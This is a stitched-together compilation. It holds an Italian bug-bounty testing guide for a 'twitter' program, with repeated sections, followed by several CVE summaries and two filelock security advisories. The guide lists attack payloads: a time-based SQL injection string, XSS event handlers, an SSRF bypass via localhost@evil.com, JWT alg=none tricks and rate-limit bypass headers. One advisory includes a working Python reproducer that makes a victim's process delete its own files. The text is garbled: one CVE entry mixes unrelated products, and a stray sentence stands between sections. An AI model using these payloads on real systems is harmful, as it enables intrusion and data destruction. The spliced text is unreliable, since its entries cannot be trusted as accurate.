titolo: twitter Vulnerability Disclosure Program
descrizione: twitter public bug bounty program

scope: App mobile su Google Play / App Store
outOfScope: Attacchi DDoS / volumetrici
Social engineering su dipendenti
Test su ambienti di produzione con dati reali di utenti
Spam o invio massivo di contenuti
Vulnerabilità in browser di terze parti (es. Chrome bugs)
Rate limiting issues senza impatto reale
Self-XSS (richiede azione della vittima)
Vulnerabilità che richiedono accesso fisico al device
Clickjacking su pagine senza azioni sensibili
Best practice senza impatto dimostrabile
Username/email enumeration su form pubblici
CSRF su endpoint non state-changing
Vulnerabilità già note pubblicamente senza PoC aggiuntivo
Problemi di SPF/DKIM/DMARC
Mixed content warnings su pagine non autenticabili

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

reportingSteps: 1. REGISTRAZIONE: Crea un account sul programma e metti il tuo handle di test in bio
2. RACCOLTA PROVE: Cattura screenshot/video di OGNI step della riproduzione con timestamp
3. MINIMIZZAZIONE: Crea un account demo e un account vittima (no dati reali)
4. REDAZIONE REPORT: Segui il template del programma, includi: Summary, Impact, Steps to Reproduce, PoC, Remediation
5. IMPATTO BUSINESS: Spiega sempre "What can an attacker do?" non solo "How does it work"
6. CVSS SCORE: Calcola il punteggio CVSS v3.1 con cvss calculator
7. SUBMIT: Carica su HackerOne/Bugcrowd/Intigriti e attendi triage (24-72h)
8. DUPLICATI: Se è un dup, è normale. Continua a cacciare!
9. RETEST: Dopo il fix, verifica che la patch funzioni davvero
10. DISCLOSURE: Aspetta il permesso del programma prima di blog/tweet
quickStartGuide: Step 1: Leggi TUTTO il policy del programma su twitter
Step 2: Configura Burp Suite con il proxy del tuo browser (FoxyProxy)
Step 3: Crea due account: attaccante e vittima su due browser diversi
Step 4: Mappa tutte le feature: signup, login, profilo, pagamenti, API
Step 5: Inizia con OWASP Top 10 e tools automatici (nuclei, sqlmap)
Step 6: Testa manualmente la business logic (sconti, ruoli, workflow)
Step 7: Documenta OGNI cosa interessante
Step 8: Scrivi un report chiaro con PoC riproducibile in 5 minuti
Step 9: Submeti e rispondi velocemente a domande del triage
Step 10: Studia i report pubblici (HackerOne Hacktivity) per imparare
tips: 💡 Leggi almeno 50 report risolti su HackerOne Hacktivity prima di iniziare
💡 Concentrati su UN programma per almeno 2 settimane
💡 Le business logic bug pagano DI PIÙ delle XSS
💡 I bug race condition sono sottovalutati ma pagati
💡 Usa Wayback Machine (web.archive.org) per trovare endpoint dimenticati
💡 Controlla sempre le API mobile vs web
💡 Non riportare MAI self-XSS, clickjacking senza impatto
💡 Impara Burp a livello avanzato: macro, match/replace, scanner
💡 La qualità del report > quantità
💡 Network: Discord Bugcrowd, NahamSec, InsiderPhD, STÖK

testingTechniques.name: Ricognizione & Enumerazione
testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
steps: Testa risposta su /api/login con credenziali vuote/invalide
Verifica rate limiting su OTP/2FA
Prova JWT manipulation: alg=none, alg=HS256 con public key
Testa password reset con token di un altro utente
Verifica session fixation e session hijacking

testingTechniques.name: API Endpoint Discovery
testingTechniques.description: Mappa tutti gli endpoint API, parametri e metodi accettati
steps: Intercetta traffico con Burp Suite o OWASP ZAP
Usa kiterunner o wordlists API comuni
Testa metodi HTTP alternativi: PUT, DELETE, PATCH, OPTIONS
Verifica GraphQL introspection se presente
Leggi documentazione API pubblica su /docs, /swagger

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

No same-namespace check or allowlist exists anywhere in the code path.

titolo: CVE-2026-105949: Cruise Control's Jetty ConstraintSecurityHandler registers security constraints on exact path specs ...
descrizione: Cruise Control's Jetty ConstraintSecurityHandler registers security constraints on exact path specs without a catch-all wildcard constraint and without calling setDenyUncoveredHttpMethods(true). The servlet routes requests using Path.of(pathInfo).getFileName(), which strips all leading segments and trailing slashes. Requests like POST /kafkacruisecontrol/x/rebalance bypass authentication entirely but still dispatch to admin endpoints. All 15 admin endpoints become reachable without authentication. In AMQ Streams, the Strimzi operator's NetworkPolicy restricts Cruise Control port 9090 to operator pods only, reducing effective severity to Important.

Performing a manipulation of the argument host/port/username/password/type/status results in code injection. The attack can be initiated remotely. The exploit has been released to the public and may be used for attacks. The patch is named 40945057cb451f0f35153110bc7e889c094400e1. Applying a patch is the recommended action to fix this issue. The vendor explains: "While we have implemented this patch as a defense-in-depth measure, we emphasize that in Open Source Social Network (OSSN), site administrators are fully trusted users who are intentionally granted broad system authority by design including the native ability to upload custom components/themes containing arbitrary PHP code."

Red Hat Subscription Management (RHSM) authentication tokens are passed as command-line arguments to background helper processes during image retrieval operations. This flaw can lead to information disclosure, potentially allowing unauthorized access to RHSM resources within the token's validity period.

This credential disclosure can allow unauthorized access to the guest virtual machine's graphical console.

titolo: CVE-2026-14933: Cross-site scripting in the embedded co-browsing feature in Unblu inc. Unblu Spark 7.0 through 7.57....
descrizione:
Cross-site scripting in the embedded co-browsing feature in Unblu inc. Unblu Spark 7.0 through 7.57.7 and 8.0 through 8.39.2, on on-premises and cloud deployments, allows an unauthenticated remote attacker in the visitor role to execute arbitrary JavaScript in the browser of an agent taking part in the attacker's co-browsing session, via content of the co-browsed page that the agent's browser renders as HTML.



The JavaScript runs in the context and under the identity of the agent's session in the Agent Desk or the Single Conversation Desk.



Exploitation requires an agent to join an embedded co-browsing session with the attacker. Mobile co-apping isn't affected.

titolo: CVE-2026-113619: In Eclipse ioFog Controller versions 3.8.0 through 3.9.1, POST, PUT, and PATCH bodies on routes that...
descrizione: In Eclipse ioFog Controller versions 3.8.0 through 3.9.1, POST, PUT, and PATCH bodies on routes that enable template substitution are rendered by an uncapped Liquid engine before authentication and RBAC. The bearer check does not reject a missing or invalid token, and the auth rate limit applies only to user login routes. A small JSON body can stall or abort the Controller process. The anonymous caller does not receive the rendered result; the impact is availability of the control plane, including the agent API and in-process WebSocket relays on that process.

titolo: CVE-2026-113620: In Eclipse ioFog Controller versions 3.8.0 through 3.9.1, operator WebSocket upgrades on the exec an...
descrizione: In Eclipse ioFog Controller versions 3.8.0 through 3.9.1, operator WebSocket upgrades on the exec and log routes do not verify the bearer JWT. The payload is decoded and its groups or roles are used as RBAC subjects. A self-minted token whose groups contain admin matches the built-in admin role, with no account and no RoleBinding. The attacker can open an exec or log session for a microservice or fog whose UUID they already know. HTTP routes are not affected: they verify the token before RBAC. Agent WebSockets verify the fog token and are not affected.

titolo: GHSA-jqc4-5cvw-7w85: filelock: ReadWriteLock on the hard-link route deletes any directory another user renames onto its .filelock-* link directory name
descrizione:
`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) remove their private `.filelock-*` link directories with `shutil.rmtree` (a recursive delete) on a remembered path. They do not check that the path still names the directory they created. This happens on the hard-link route (a hard link is a second name for the same file). That route is every connection on macOS since 4.1.1 and any POSIX process without a usable `/proc/self/fd` (a Linux path that names the process's own open files), such as a chroot or container that does not mount `/proc`.

Another local user who can rename entries in the directory that holds the lock database can rename one of the directories of the user running the lock (below: the lock user) onto the link directory's name, or onto a forged dead-holder name. Such a lock directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). The lock user's process then deletes that tree and everything in it with the lock user's permissions, and reports no error. Stock Linux with `/proc` mounted is not affected. Affected versions are filelock 4.1.0 through 4.2.0.

Anthropic's OSS Scanner reported this in private as `ANT-2026-LSSZIUEO` [high, CWE-367]: ReadWriteLock deletes any directory another user renames to .filelock-*.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` scores 6.1 (Medium).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): two `rename` calls and no race against filelock's own code. `I:H` (high integrity impact): the other user destroys a directory tree owned by the lock user, and the lock user's program reports no error. `A:L` (partial availability loss): the Python 3.11 `RecursionError` variant makes the lock user's first lock construction fail. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.

Classification from the external review: **conditional security**, a cross-user rename in a non-sticky shared parent that turns private-link cleanup into recursive deletion of the lock user's tree. The scanner rated it high. The review accepts the mechanism, notes that the macOS route rests on a Linux run with `/proc` hidden rather than on a run on macOS, and narrows the finding to that precondition and route.

## Scope and preconditions

- The other party is a different local account with write permission on the directory that holds the lock database, where that directory has no sticky bit. That is a `0777` directory, or a group-writable one (in a setgid `2775` directory a group member can rename the lock user's sub-directory the same way). Renaming an entry needs write permission on the parent only, not on the entry. Anyone who can write the parent can rename a `0700` directory of the lock user.
- Sticky directories (`/tmp` itself, any `1777` directory) stop the release variant: the rename of an entry owned by the lock user fails with `EPERM`. The dead-owner sweep still reaches a lock user's tree that sits inside a directory the other account owns there. That account may rename its own directory to a forged dead-owner name, and the lock user's sweep deletes everything inside it. The Python 3.11 `RecursionError` variant also works in a sticky directory.
- Platform and route. The lock user must connect through the private hard link. That is every `ReadWriteLock` or `AsyncReadWriteLock` on macOS (since 4.1.1, #820), or a POSIX process whose `/proc/self/fd/<n>` (`/dev/fd/<n>` elsewhere) does not exist, such as a chroot or container without `/proc`. Linux with `/proc` mounted connects through the descriptor and creates no `.filelock-*` directory (checked: none appears, also with two holders in one process), so stock Linux is not affected at 4.2.0. The macOS statement rests on the `descriptor_usable` branch at line 984 and `docs/how-to.rst`. The reproducer runs the same Python code on Linux with `/proc` hidden, which takes root and is test scaffolding, not a step the other user performs. Windows does not take this route.
- Target set. Only directories that sit in the shared parent itself, or that the other account can already write, are reachable. The kernel refuses to move a `0700` directory of the lock user in from another parent. A tree the other account can already write (a group-writable project tree created with umask `002`) is no gain, since that account can delete it without filelock. A lock user running as root deletes a tree of any owner.
- Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky.

## Affected code

At the scanned commit `b831496b0273`: [`_ForkSafeConnection.close` runs `shutil.rmtree` on the remembered `mkdtemp` path](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L290-L296). The path comes from [`retain_until_close`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L305-L307), set on the [link route in `_connect_through_descriptor`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L984-L1011), where [`descriptor_usable` is `False` on macOS](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L984). Three more `rmtree` sites sit in [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029) (lines 1023 and 1026) and the connect's `finally` (line 1011). The fifth is in [`_sweep_links_of_the_dead`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1032-L1051), with the name parser [`_owner_is_gone`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1054-L1065) and [`_link_prefix`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1068-L1071).

## Introduced

The link directory moved beside the database in `015d27c` ("fix(read-write): reject WAL databases and link beside the db (#805)"), and the dead-owner sweep came with `df06bbd` (#815). Both were first released in **4.1.0** (verified: `git tag --contains` gives 4.1.0 for both; 4.0.11 and 4.0.12 made the link in `TMPDIR`). macOS takes the link route for every connection since `5fd0c8f` (#820), first released in **4.1.1** (verified).

## Mechanism

When the lock connects through its private hard link, it disposes of `.filelock-*` directories with `shutil.rmtree` on a path. Nothing ties that path to the directory filelock created. `mkdtemp` makes the name unpredictable and the directory `0700`. The name is in the parent's listing as soon as it exists (`ls -a`), and renaming it needs write permission on the parent only. `0700` keeps the other user out of the directory; it does not stop a rename of the directory. There are two ways in, with the same preconditions.

**On release.** A connection lives for one acquisition: `_open_for_acquisition` opens it and `release()` reaches `close` through `_release` and `_finish_connection`. The code trusts the path from the acquire to the release, for as long as the application keeps the lock. While the lock user holds `write_lock()` on `/tmp/shared-cache/cache.db`, the directory lists `.filelock-<pid>--<host digest>-<random>/` (`0700`, owned by the lock user, containing `lock.db`). The other user runs two renames: that directory to `moved-aside`, then `victim_project` (a `0700` directory of the lock user with `notes.txt` inside) onto the link directory's name. When the lock user leaves the `with` block, `rmtree` deletes `victim_project` and everything in it with the lock user's permissions, and the process exits with status 0. `moved-aside/lock.db`, the real link, stays behind as an extra hard link to the database. The constructor's validation connection (`ReadWriteLock.__init__` opens and closes one, creating and removing a link directory) and the three error-path removals trust the path the same way, with windows a few system calls long.

**In the dead-owner sweep.** `_link_beside` calls `_sweep_links_of_the_dead(parent)` once per process and parent directory before `mkdtemp`. The first connect of every process on the link route runs it, the validation connection included. It runs `rmtree` on every `.filelock-*` directory whose name parses as a dead owner's. It checks neither the directory's owner, nor its mode, nor whether it holds only `lock.db`. `_owner_is_gone` splits the name after `.filelock-` into `pid`, `start`, `digest` (a hash of the host name) and a suffix. It returns `digest == _host_digest(host) and owner_is_stale(pid, host, start or None)`.

The other user can forge every field. Take `.filelock-2147483647--<digest>-x`. `pid` is the largest value the #821 range check accepts and above the PID limit of Linux and macOS, so `process_alive` gets `ESRCH` from `os.kill(pid, 0)`; the PID of any exited process, such as a child the other user just reaped, passes as well. `start` is empty, which the parser accepts because `_link_prefix` writes an empty field when it has no start token; with no token and a dead PID `owner_is_stale` returns `True`. `digest` is `sha256(host_name())[:16]`. `host_name()` adds a PID-namespace tag only when `/proc/self/ns/pid` is readable, which it is not on macOS or without `/proc`, so any local user can compute the digest, and it is in the name of every link directory the lock user creates. The parser does not look at the suffix.

One `rename("victim_project", ".filelock-2147483647--<digest>-x")` at any time, with no lock held, gets the tree deleted the next time any lock user process on the link route constructs a lock in that directory (a cron job, a CI step, a service restart). #821 made the parser reject non-ASCII digits and out-of-range PIDs; a well-formed name for a PID that is not running still selects the directory for removal.

The sweep's `rmtree` has a smaller effect that needs no lock user tree and works in a sticky directory, on Python 3.11, where `shutil.rmtree` recurses once per directory level. The other user creates a directory of their own under a forged dead-owner name in a `1777` directory, with 1500 nested subdirectories inside. The first `ReadWriteLock(...)` a lock user process on the link route constructs there raises `RecursionError`, which the `suppress(OSError)` at line 1050 does not catch. A second attempt in the same process skips the sweep and succeeds. Python 3.14 walks the same tree without an error.

## Reproduction

The scanner's reproducer for `ANT-2026-LSSZIUEO`, quoted as received. It ran against commit `b831496b0273`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys

shared = "/tmp/shared-cache"
project = f"{shared}/victim_project"

# ReadWriteLock takes the hard-link route (.filelock-* directory beside the database) on macOS, and elsewhere when
# /proc/self/fd/<n> is unusable. An empty /proc in a private mount namespace puts unmodified filelock on that route.
os.unshare(os.CLONE_NEWNS)
subprocess.run(["mount", "--make-rprivate", "/"], check=True)
subprocess.run(["mount", "-t", "tmpfs", "tmpfs", "/proc"], check=True)

# set up: a shared directory without the sticky bit, holding the victim's private tree
shutil.rmtree(shared, ignore_errors=True)
os.mkdir(shared)
os.chmod(shared, 0o777)
os.mkdir(project, 0o700)
with open(f"{project}/notes.txt", "w") as notes_file:
    notes_file.write("victim data\n")
shutil.chown(f"{project}/notes.txt", "victim", "victim")
shutil.chown(project, "victim", "victim")

rm = subprocess.run(["runuser", "-u", "attacker", "--", "rm", "-rf", project], capture_output=True, text=True)
print("attacker runs rm -rf on the victim's tree:", rm.stderr.strip())
assert os.path.exists(f"{project}/notes.txt"), "setup: the attacker could delete the tree without filelock"

# the victim takes the write lock and stays in its critical section
victim = subprocess.Popen(
    ["runuser", "-u", "victim", "--", sys.executable, "/tmp/repro.d/victim_hold_write_lock.py"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    text=True,
)
assert victim.stdout.readline() == "holding the write lock\n", "setup: the victim did not take the lock"
print("while the victim holds the lock:", sorted(os.listdir(shared)))

# attack
subprocess.run(["runuser", "-u", "attacker", "--", sys.executable, "/tmp/repro.d/attacker_swap_link_dir.py"], check=True)
link_dir = next(name for name in os.listdir(shared) if name.startswith(".filelock-"))
notes = f"{shared}/{link_dir}/notes.txt"
print("after the attacker's renames:", sorted(os.listdir(shared)))
print(f"{notes} exists:", os.path.exists(notes))
assert os.path.exists(notes), "setup: the attacker's renames did not happen"

# the victim leaves its with block
victim.communicate("\n", timeout=30)
print("victim exit status:", victim.returncode)
print("after the release:", sorted(os.listdir(shared)))
print(f"{notes} exists:", os.path.exists(notes))

# check: releasing a lock must not delete the victim's files
print("BUG" if not os.path.exists(notes) else "OK")
```

**`repro.d/attacker_swap_link_dir.py`**

```python
import os

shared = "/tmp/shared-cache"

# both directories are 0700 and owned by victim; renaming them needs write permission on the parent only
link_dir = next(name for name in os.listdir(shared) if name.startswith(".filelock-"))
os.rename(f"{shared}/{link_dir}", f"{shared}/moved-aside")
os.rename(f"{shared}/victim_project", f"{shared}/{link_dir}")
```

**`repro.d/victim_hold_write_lock.py`**

```python
import sys

from filelock import ReadWriteLock

lock = ReadWriteLock("/tmp/shared-cache/cache.db")
with lock.write_lock():
    print("holding the write lock", flush=True)
    sys.stdin.readline()  # stands for the work the lock protects; it ends when repro sends a line
```

## Attack sequence

```mermaid
sequenceDiagram
    participant A as other local user
    participant V as lock user's process (link route)
    participant K as filesystem (parent 0777, no sticky bit)
    rect rgb(255, 214, 214)
        Note over A,K: filelock 4.1.0 to 4.2.0 on macOS, or POSIX without /proc
        V->>K: mkdtemp(.filelock-PID--DIGEST-XXXX) mode 0700, link cache.db inside as lock.db
        V->>K: BEGIN EXCLUSIVE, write lock held
        A->>K: rename(.filelock-PID--DIGEST-XXXX, moved-aside)
        A->>K: rename(victim_project, .filelock-PID--DIGEST-XXXX)
        V->>K: release() calls shutil.rmtree(".filelock-PID--DIGEST-XXXX")
        Note over V,K: victim_project and notes.txt are gone, exit status 0, moved-aside/lock.db stays
        A->>K: later, with no lock held, rename(any directory, .filelock-2147483647--DIGEST-x)
        V->>K: next ReadWriteLock(...) in that directory sweeps dead owners by name and rmtree's the forged one
    end
```

## Evidence

The scanner's reproducer needs no race. It enters a private mount namespace and mounts an empty tmpfs over `/proc` for itself and its children (the only non-default condition, standing in for macOS). It creates `/tmp/shared-cache` (`0777`, no sticky bit) with `victim_project/notes.txt` (`0700`, owned by `victim`), shows that `rm -rf` on that tree as `attacker` fails with `Permission denied`, runs the `victim` program (`ReadWriteLock("/tmp/shared-cache/cache.db")` + `with lock.write_lock():`) and the `attacker` renames, then lets the `victim` program release. Expected output on the scanned commit:

```
attacker runs rm -rf on the victim's tree: rm: cannot remove '/tmp/shared-cache/victim_project': Permission denied
while the victim holds the lock: ['.filelock-106--39c81e1bf87b1d56-os_58i3c', 'cache.db', 'victim_project']
after the attacker's renames: ['.filelock-106--39c81e1bf87b1d56-os_58i3c', 'cache.db', 'moved-aside']
/tmp/shared-cache/.filelock-106--39c81e1bf87b1d56-os_58i3c/notes.txt exists: True
victim exit status: 0
after the release: ['cache.db', 'moved-aside']
/tmp/shared-cache/.filelock-106--39c81e1bf87b1d56-os_58i3c/notes.txt exists: False
BUG
```

The scanner showed the sweep variant by hand with the same setup and no lock held. As `attacker`, one rename of `victim_project` to `.filelock-2147483647--<digest>-x` with `<digest> = hashlib.sha256(socket.gethostname().encode()).hexdigest()[:16]`, then `ReadWriteLock("/tmp/shared-cache/cache.db")` as `victim` with `/proc` hidden. `notes.txt` is gone after the constructor returns and the directory contains only `cache.db`.

Our verification: `BUG` on `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #834 head: `OK`; the listing after the release is `['.filelock-12--4fd1986a778d5977-amfxfd9k', 'cache.db', 'moved-aside']`, `notes.txt exists: True`, and the `victim` program exits 0. Neither the scanner nor the review executed on macOS; the macOS claim rests on the `descriptor_usable` branch and the identical code after it.

## Impact

The other user chooses any directory that sits in the shared parent, and the lock user's process deletes it and everything in it with the lock user's permissions and no error; the lock user's program reports success. Without filelock that user can rename such a directory but cannot remove a non-empty one whose contents they have no permission on. With filelock the lock user's process destroys the contents. The release variant needs two `rename` calls at any point while the lock user holds the lock and wins no race against filelock's own code. The sweep variant needs one rename and no held lock, and fires on the next lock construction by any lock user process in that directory. The real link directory stays under its new name with an extra hard link to the database.

It is **not** reachable on stock Linux with `/proc` mounted at 4.2.0. The release variant is **not** reachable in a sticky directory. This is the same position as in GHSA-j8f7-rjxc-mr56 (a user who can change names in a shared lock directory). Here the name is the derived `.filelock-*` directory rather than the database, and the redirected operation is a recursive delete.

## Workarounds

- On macOS, and on any POSIX system where `/proc/self/fd` is unavailable, keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share one `ReadWriteLock` database between accounts through a `0777` or group-writable directory.
- Do not keep other directories of value beside a lock database in a directory other accounts can write; the deletion targets are siblings of the database.
- On Linux with `/proc` mounted, 4.2.0 does not take the link route and needs no workaround for this finding.

## Patched version

4.2.1.

titolo: GHSA-9vhv-jxww-xfm5: filelock: ReadWriteLock on Windows acts on SQLite side files another local user places beside its database
descrizione:
On Windows, `ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) connect SQLite to the lock database by its path, in every directory. SQLite derives three side files from that path: `<database>-journal`, the rollback journal (pages saved to undo an interrupted write); `<database>-wal`, the write-ahead log (changes kept outside the main file); and `<database>-shm`, the shared-memory index of the WAL. SQLite acts on whichever of these it finds beside the database before the lock runs any statement. Another local account that can create files in the database's directory, but not delete files of other accounts there, places such a side file beside the database and denies everyone `DELETE` on it, which a file's creator may do. `C:\Windows\Temp` (the temporary directory of services, granting `BUILTIN\Users` create but not delete) and `C:\Users\Public` are such directories.

With a `-wal` in place, every `read_lock()` and `write_lock()` of the user running the lock (below: the lock user) raises `sqlite3.OperationalError: disk I/O error` at once, whatever `timeout` says, until that account removes its file; the lock user cannot. With a `-journal` beside a lock database that holds a table, SQLite replays the journal and deletes the file the journal names, a file of the lock user, and the acquire reports success. Affected versions are filelock 3.20.4 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the POSIX form of the defect, GHSA-v4x8-3wr5-3wq8, whose text says "Windows does not take this path" (review round 4, finding F2 of set D). It is not among the findings of the report Anthropic's OSS Scanner sent on 15 October 2026.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 3.3 (Low).**

`AV:L` (local): the other account needs a logon on the same host. `AC:L` (low attack complexity): create one file beside the database and set its ACL (access control list); no race, and the other account can place the file days earlier. `PR:L` (low privileges): an ordinary account that can create files in the directory is enough. `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` (no confidentiality impact): the other account learns nothing. `I:N` (no integrity impact in the scored variant): see the scoring note. `A:L` (partial availability impact): every acquire fails with an exception that `Timeout` handlers do not catch, until the other account removes its file; no crash, and the lock's own data is not changed.

Scoring note. The deletion variant reads `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L` (3.6): `I:L` because the lock user's process deletes one file the journal names, `AC:H` because it needs a lock database that holds a table, which filelock does not create, and a journal the lock user can open for writing. The lower-reading rule of this advisory set scores the variant that reaches every `ReadWriteLock` on Windows in such a directory, 3.3, and describes the deletion variant under Mechanism. Classification from the review: **security** (another account), availability for the scored variant.

## Scope and preconditions

- Platform and classes: Windows only. `ReadWriteLock` and `AsyncReadWriteLock`, both of which connect through `_connect`. On Linux and macOS the lock takes other routes, covered by GHSA-v4x8-3wr5-3wq8.
- Directory: one where another account can create files but cannot delete the lock user's. `C:\Windows\Temp` carries `BUILTIN\Users:(CI)(S,WD,AD,X)` (create file and create subdirectory, no delete child); `C:\Users\Public` and any directory with such an entry qualify. A directory only the lock user can write, such as `%LOCALAPPDATA%` or the per-user temporary directory, is not affected.
- The other account creates `<database>-wal`, grants everyone modify and denies everyone `DELETE` on it. A file's creator may set both. The lock user can open and read the file but not delete it.
- Deletion variant: the lock database holds at least one table (filelock creates an empty database, and the review's reproducer has the lock account create the table), and the other account's `<database>-journal` grants the lock account modify rights. The journal's tail names a file the lock user can delete.
- What the lock user sees: `write_lock(timeout=1)` raised `sqlite3.OperationalError: disk I/O error` with the undeletable `-wal` in place; with the writable journal the acquire succeeded and the named file was gone; with an undeletable journal every acquire raised `sqlite3.OperationalError: unable to open database file`.
- The documentation at the scanned commit states "the lock directory must not be writable by untrusted users" for `WindowsFileLock`, in its symlink paragraph; the `ReadWriteLock` documentation names no directory requirement on Windows.

## Affected code

